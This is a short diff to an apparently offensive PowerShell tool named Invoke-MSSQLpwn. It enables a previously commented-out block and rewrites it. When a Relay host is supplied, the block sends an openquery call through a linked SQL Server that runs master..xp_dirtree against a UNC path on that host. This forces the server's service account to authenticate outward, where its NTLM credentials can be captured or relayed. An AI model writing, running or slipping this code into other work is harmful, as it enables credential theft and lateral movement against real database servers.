@@ -266,15 +266,13 @@ Function Invoke-MSSQLpwn{
         }
         $sqlCmd = New-Object System.Data.SqlClient.SqlCommand
         $sqlCmd.Connection = $sqlConnection
-        <#
         if ($PSBoundParameters.ContainsKey('Relay')){
-            $sqlCmd.CommandText = "EXEC ('master..xp_dirtree ''\\\$Relay\\\test''') AT '$Link';"
+            $sqlCmd.CommandText = 'SELECT 1 FROM openquery("{0}",''SELECT 1;EXEC master..xp_dirtree ''''\\{1}\\test'''';'')' -f $Link,$Relay
             $reader = $sqlCmd.ExecuteReader()
             $reader.Close()
             $sqlConnection.Close()
             return
         }
-        #>
         if ($Mode -eq 2){
         } else {
             if ($PSBoundParameters.ContainsKey('Impersonate')){
